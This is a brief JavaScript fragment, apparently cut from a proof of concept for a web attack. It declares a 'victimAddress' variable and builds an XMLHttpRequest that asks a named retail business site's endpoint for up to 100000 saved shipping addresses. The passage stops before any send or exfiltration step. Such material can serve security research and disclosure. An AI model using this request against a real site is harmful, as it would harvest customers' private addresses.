...
var victimAddress;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.costcobusinesscentre.ca/AjaxCostcoGetAddressCmd?requesttype=ajax&addressType=S&filterName=ALL&filterOrder=RECENT&start=1&end=100000", true);
